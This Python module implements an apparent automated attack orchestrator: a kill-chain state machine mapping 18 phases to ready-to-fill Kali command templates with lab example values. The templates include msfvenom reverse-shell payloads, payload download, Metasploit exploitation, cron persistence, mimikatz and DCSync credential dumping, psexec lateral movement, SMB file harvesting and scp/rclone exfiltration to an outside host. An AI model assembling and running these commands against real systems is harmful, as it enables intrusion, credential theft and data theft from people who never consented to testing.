from enum import IntEnum
from dataclasses import dataclass, field
from typing import Optional

class UckcPhase(IntEnum):
    RECONNAISSANCE = 1
    WEAPONIZATION = 2
    DELIVERY = 3
    SOCIAL_ENGINEERING = 4
    EXPLOITATION = 5
    PERSISTENCE = 6
    DEFENSE_EVASION = 7
    COMMAND_AND_CONTROL = 8
    PIVOTING = 9
    DISCOVERY = 10
    PRIVILEGE_ESCALATION = 11
    EXECUTION = 12
    CREDENTIAL_ACCESS = 13
    LATERAL_MOVEMENT = 14
    COLLECTION = 15
    EXFILTRATION = 16
    IMPACT = 17
    OBJECTIVES = 18

PHASE_META: dict[UckcPhase, dict] = {
    UckcPhase.RECONNAISSANCE: {"name": "Reconnaissance", "mitre": "TA0043", "desc": "Identify targets, ports, services, OS."},
    UckcPhase.WEAPONIZATION: {"name": "Weaponization", "mitre": "TA00xx", "desc": "Create payload / exploit pairing."},
    UckcPhase.DELIVERY: {"name": "Delivery", "mitre": "TA00xx", "desc": "Deliver weapon to target."},
    UckcPhase.SOCIAL_ENGINEERING: {"name": "Social Engineering", "mitre": "TA00xx", "desc": "Human vector delivery."},
    UckcPhase.EXPLOITATION: {"name": "Exploitation", "mitre": "TA0002", "desc": "Exploit vulnerability."},
    UckcPhase.PERSISTENCE: {"name": "Persistence", "mitre": "TA0003", "desc": "Maintain access."},
    UckcPhase.DEFENSE_EVASION: {"name": "Defense Evasion", "mitre": "TA0005", "desc": "Bypass defenses."},
    UckcPhase.COMMAND_AND_CONTROL: {"name": "Command & Control", "mitre": "TA0011", "desc": "C2 channel."},
    UckcPhase.PIVOTING: {"name": "Pivoting", "mitre": "TA00xx", "desc": "Tunnel through compromised host."},
    UckcPhase.DISCOVERY: {"name": "Discovery", "mitre": "TA0007", "desc": "Internal enumeration."},
    UckcPhase.PRIVILEGE_ESCALATION: {"name": "Privilege Escalation", "mitre": "TA0004", "desc": "Escalate privileges."},
    UckcPhase.EXECUTION: {"name": "Execution", "mitre": "TA0002", "desc": "Execute code on target."},
    UckcPhase.CREDENTIAL_ACCESS: {"name": "Credential Access", "mitre": "TA0006", "desc": "Harvest creds."},
    UckcPhase.LATERAL_MOVEMENT: {"name": "Lateral Movement", "mitre": "TA0008", "desc": "Move to adjacent hosts."},
    UckcPhase.COLLECTION: {"name": "Collection", "mitre": "TA0009", "desc": "Gather data."},
    UckcPhase.EXFILTRATION: {"name": "Exfiltration", "mitre": "TA0010", "desc": "Exfiltrate data."},
    UckcPhase.IMPACT: {"name": "Impact", "mitre": "TA0040", "desc": "Manipulate/disrupt."},
    UckcPhase.OBJECTIVES: {"name": "Objectives", "mitre": "TA00xx", "desc": "Report & capture evidence."},
}

@dataclass
class ParamSpec:
    name: str
    type: str  # str|int|bool
    required: bool = True
    default: Optional[str] = None
    description: str = ""
    example: str = ""

@dataclass
class ToolSpec:
    name: str
    template: str  # with {placeholders} for shlex assembly
    description: str
    params: list[ParamSpec] = field(default_factory=list)
    parser: str = "generic"  # nmap_xml|hashcat|hydra|generic

# Pre-configured mapping for UCKC 18 phases -> Kali tools
TOOL_MAPPING: dict[UckcPhase, list[ToolSpec]] = {
    UckcPhase.RECONNAISSANCE: [
        ToolSpec("nmap", "nmap {scan_type} {ports} {extra} {target}", "Network scanner - default discovery", [
            ParamSpec("target", "str", True, None, "Target IP/CIDR", "192.168.56.101"),
            ParamSpec("scan_type", "str", False, "-sV -sC", "Scan type", "-sV -sC"),
            ParamSpec("ports", "str", False, "", "Ports e.g. -p- or -p 22,80", "-p 22,80,443"),
            ParamSpec("extra", "str", False, "", "Extra flags", "-oX -"),
        ], parser="nmap_xml"),
        ToolSpec("masscan", "masscan {target} -p{ports} --rate {rate}", "High-speed port scanner", [
            ParamSpec("target", "str", True, None, "Target", "192.168.56.0/24"),
            ParamSpec("ports", "str", True, "0-65535", "Ports", "0-65535"),
            ParamSpec("rate", "str", False, "1000", "Rate", "1000"),
        ]),
        ToolSpec("nuclei", "nuclei -u {target} -severity {severity}", "Vuln scanner", [
            ParamSpec("target", "str", True, None, "URL/IP", "http://192.168.56.101"),
            ParamSpec("severity", "str", False, "critical,high", "Severity", "critical,high"),
        ]),
    ],
    UckcPhase.WEAPONIZATION: [
        ToolSpec("msfvenom", "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}", "Payload generator", [
            ParamSpec("payload", "str", True, "linux/x64/meterpreter/reverse_tcp", "Payload", "linux/x64/meterpreter/reverse_tcp"),
            ParamSpec("lhost", "str", True, None, "LHOST", "192.168.56.1"),
            ParamSpec("lport", "str", True, "4444", "LPORT", "4444"),
            ParamSpec("format", "str", False, "elf", "Format", "elf"),
            ParamSpec("output", "str", False, "/tmp/payload.elf", "Output", "/tmp/payload.elf"),
        ]),
    ],
    UckcPhase.DELIVERY: [
        ToolSpec("curl", "curl -v {url} -o {output}", "Delivery via HTTP", [
            ParamSpec("url", "str", True, None, "URL", "http://192.168.56.1/payload.elf"),
            ParamSpec("output", "str", False, "/tmp/payload.elf", "Output", "/tmp/payload.elf"),
        ]),
        ToolSpec("msfconsole", "msfconsole -q -x \"use {module}; set RHOSTS {rhosts}; exploit\"", "Metasploit delivery", [
            ParamSpec("module", "str", True, "exploit/unix/ftp/vsftpd_234_backdoor", "Module", "exploit/unix/ftp/vsftpd_234_backdoor"),
            ParamSpec("rhosts", "str", True, None, "RHOSTS", "192.168.56.101"),
        ]),
    ],
    UckcPhase.SOCIAL_ENGINEERING: [
        ToolSpec("setoolkit", "setoolkit", "Social Engineer Toolkit", []),
        ToolSpec("gophish", "gophish", "Phishing framework", []),
    ],
    UckcPhase.EXPLOITATION: [
        ToolSpec("msfconsole", "msfconsole -q -x \"use {module}; set RHOSTS {target}; set RPORT {rport}; exploit\"", "Exploit", [
            ParamSpec("module", "str", True, "exploit/linux/http/apache_mod_cgi_bash_env_exec", "Module", "exploit/unix/ftp/vsftpd_234_backdoor"),
            ParamSpec("target", "str", True, None, "Target", "192.168.56.101"),
            ParamSpec("rport", "str", False, "", "RPORT", "80"),
        ]),
        ToolSpec("sqlmap", "sqlmap -u {url} --batch --crawl=1", "SQL injection", [
            ParamSpec("url", "str", True, None, "URL", "http://192.168.56.101/page?id=1"),
        ]),
    ],
    UckcPhase.PERSISTENCE: [
        ToolSpec("cron", "echo '{cron_line}' | crontab -", "Cron persistence", [ParamSpec("cron_line", "str", True, None, "Cron", "* * * * * /tmp/payload.elf")]),
        ToolSpec("mimikatz", "mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "Persistence via creds", []),
    ],
    UckcPhase.DEFENSE_EVASION: [
        ToolSpec("amsi-bypass", "echo 'AMSI bypass placeholder - manual review required'", "AMSI bypass", []),
    ],
    UckcPhase.COMMAND_AND_CONTROL: [
        ToolSpec("msfconsole_handler", "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit\"", "C2 handler", [
            ParamSpec("payload", "str", True, "linux/x64/meterpreter/reverse_tcp", "Payload", "linux/x64/meterpreter/reverse_tcp"),
            ParamSpec("lhost", "str", True, None, "LHOST", "0.0.0.0"),
            ParamSpec("lport", "str", True, "4444", "LPORT", "4444"),
        ]),
        ToolSpec("sliver", "sliver", "Sliver C2", []),
    ],
    UckcPhase.PIVOTING: [
        ToolSpec("chisel", "chisel server -p {port} --reverse", "Pivoting tunnel", [ParamSpec("port", "str", False, "8000", "Port", "8000")]),
        ToolSpec("ssh", "ssh -N -D {socks_port} {user}@{target}", "SOCKS proxy pivot", [
            ParamSpec("socks_port", "str", False, "1080", "SOCKS port", "1080"),
            ParamSpec("user", "str", True, None, "User", "root"),
            ParamSpec("target", "str", True, None, "Target", "192.168.56.101"),
        ]),
        ToolSpec("ligolo", "ligolo-proxy -selfcert", "Ligolo pivot", []),
    ],
    UckcPhase.DISCOVERY: [
        ToolSpec("linpeas", "bash /opt/peas/linpeas.sh", "LinPEAS enumeration", []),
        ToolSpec("winPEAS", "cmd.exe /c winPEASx64.exe", "WinPEAS", []),
        ToolSpec("bloodhound", "bloodhound-python -u {user} -p {password} -ns {ns} -d {domain} -c all", "BloodHound", [
            ParamSpec("user", "str", True, None, "User", "admin"),
            ParamSpec("password", "str", True, None, "Pass", "password"),
            ParamSpec("ns", "str", True, None, "NS", "192.168.56.101"),
            ParamSpec("domain", "str", True, None, "Domain", "corp.local"),
        ]),
    ],
    UckcPhase.PRIVILEGE_ESCALATION: [
        ToolSpec("linpeas", "bash /opt/peas/linpeas.sh | tee /tmp/linpeas.out", "LinPEAS privesc", []),
        ToolSpec("sudo", "sudo -l", "Check sudo", []),
        ToolSpec("windows-exploit-suggester", "windows-exploit-suggester.py --update && windows-exploit-suggester.py --database 2024 --systeminfo {sysinfo}", "WES", [
            ParamSpec("sysinfo", "str", True, None, "systeminfo.txt path", "/tmp/sysinfo.txt"),
        ]),
    ],
    UckcPhase.EXECUTION: [
        ToolSpec("psexec.py", "psexec.py {user}:{password}@{target} \"{command}\"", "PSEXEC execution", [
            ParamSpec("user", "str", True, None, "User", "administrator"),
            ParamSpec("password", "str", True, None, "Pass", "password"),
            ParamSpec("target", "str", True, None, "Target", "192.168.56.102"),
            ParamSpec("command", "str", False, "whoami", "Command", "whoami"),
        ]),
        ToolSpec("wmiexec.py", "wmiexec.py {user}:{password}@{target}", "WMI exec", [
            ParamSpec("user", "str", True, None, "User", "administrator"),
            ParamSpec("password", "str", True, None, "Pass", "password"),
            ParamSpec("target", "str", True, None, "Target", "192.168.56.102"),
        ]),
    ],
    UckcPhase.CREDENTIAL_ACCESS: [
        ToolSpec("secretsdump.py", "secretsdump.py {domain}/{user}:{password}@{target}", "DCSync dump", [
            ParamSpec("domain", "str", True, None, "Domain", "corp.local"),
            ParamSpec("user", "str", True, None, "User", "admin"),
            ParamSpec("password", "str", True, None, "Pass", "password"),
            ParamSpec("target", "str", True, None, "Target", "192.168.56.101"),
        ]),
        ToolSpec("hashcat", "hashcat -m {mode} {hashfile} {wordlist} --force", "Hash cracking", [
            ParamSpec("mode", "str", True, "1000", "Hash mode", "1000"),
            ParamSpec("hashfile", "str", True, None, "Hashfile", "/tmp/hashes.txt"),
            ParamSpec("wordlist", "str", False, "/usr/share/wordlists/rockyou.txt", "Wordlist", "/usr/share/wordlists/rockyou.txt"),
        ]),
        ToolSpec("mimikatz", "mimikatz \"sekurlsa::logonpasswords\" exit", "Mimikatz", []),
    ],
    UckcPhase.LATERAL_MOVEMENT: [
        ToolSpec("psexec.py", "psexec.py {user}:{password}@{target}", "PSEXEC lateral", [
            ParamSpec("user", "str", True, None, "User", "admin"),
            ParamSpec("password", "str", True, None, "Pass", "password"),
            ParamSpec("target", "str", True, None, "Target", "192.168.56.102"),
        ]),
        ToolSpec("crackmapexec", "crackmapexec smb {target} -u {user} -p {password}", "CME lateral", [
            ParamSpec("target", "str", True, None, "Target", "192.168.56.0/24"),
            ParamSpec("user", "str", True, None, "User", "admin"),
            ParamSpec("password", "str", True, None, "Pass", "password"),
        ]),
        ToolSpec("smbclient", "smbclient //{target}/{share} -U {user}%{password} -c \"ls\"", "SMB lateral", [
            ParamSpec("target", "str", True, None, "Target", "192.168.56.101"),
            ParamSpec("share", "str", False, "C$", "Share", "C$"),
            ParamSpec("user", "str", True, None, "User", "admin"),
            ParamSpec("password", "str", True, None, "Pass", "password"),
        ]),
    ],
    UckcPhase.COLLECTION: [
        ToolSpec("smbclient", "smbclient //{target}/{share} -U {user}%{password} -c \"recurse; prompt; mget *\"", "SMB collection", [
            ParamSpec("target", "str", True, None, "Target", "192.168.56.101"),
            ParamSpec("share", "str", False, "C$", "Share", "C$"),
            ParamSpec("user", "str", True, None, "User", "admin"),
            ParamSpec("password", "str", True, None, "Pass", "password"),
        ]),
    ],
    UckcPhase.EXFILTRATION: [
        ToolSpec("scp", "scp -r {source} {user}@{exfil_host}:{dest}", "SCP exfil", [
            ParamSpec("source", "str", True, None, "Source", "/tmp/loot"),
            ParamSpec("user", "str", True, None, "User", "kali"),
            ParamSpec("exfil_host", "str", True, None, "Host", "192.168.56.1"),
            ParamSpec("dest", "str", False, "/tmp/", "Dest", "/tmp/"),
        ]),
        ToolSpec("rclone", "rclone copy {source} remote:{dest}", "Rclone exfil", [
            ParamSpec("source", "str", True, None, "Source", "/tmp/loot"),
            ParamSpec("dest", "str", False, "loot", "Dest", "loot"),
        ]),
    ],
    UckcPhase.IMPACT: [
        ToolSpec("custom", "echo 'Impact phase - operator defined - requires explicit approval'", "Custom impact", []),
    ],
    UckcPhase.OBJECTIVES: [
        ToolSpec("report", "echo 'Objectives: generate report from /tmp/alphax_report'", "Report", []),
    ],
}

# --- State machine helpers ---

def get_phase_name(phase: int | UckcPhase) -> str:
    p = UckcPhase(phase)
    return PHASE_META[p]["name"]

def get_next_phase(current: int | UckcPhase) -> UckcPhase | None:
    try:
        nxt = UckcPhase(int(current) + 1)
        return nxt
    except ValueError:
        return None

def get_prev_phase(current: int | UckcPhase) -> UckcPhase | None:
    try:
        prv = UckcPhase(int(current) - 1)
        return prv
    except ValueError:
        return None

def can_transition(current: int, target: int) -> bool:
    # Allow forward 1, backward any, or stay; block jumping >1 forward without success gate
    if target == current:
        return True
    if target == int(current) + 1:
        return True
    if target < current:
        return True  # allow re-run earlier phase
    return False

def list_phases() -> list[dict]:
    return [{"id": int(p), "name": PHASE_META[p]["name"], "mitre": PHASE_META[p]["mitre"], "desc": PHASE_META[p]["desc"]} for p in UckcPhase]

def get_tools_for_phase(phase: int | UckcPhase) -> list[ToolSpec]:
    return TOOL_MAPPING.get(UckcPhase(int(phase)), [])

class KillChainStateMachine:
    def __init__(self, current_phase: int):
        self.current_phase = UckcPhase(int(current_phase))

    def advance_on_success(self) -> UckcPhase | None:
        nxt = get_next_phase(self.current_phase)
        if nxt:
            self.current_phase = nxt
        return nxt

    def flag_failure(self) -> str:
        # Conditional logic: don't auto-advance, request HITL
        return "blocked_needs_input"

    def suggest_alternate_tool(self, failed_tool: str) -> ToolSpec | None:
        tools = get_tools_for_phase(self.current_phase)
        for t in tools:
            if t.name != failed_tool:
                return t
        return None
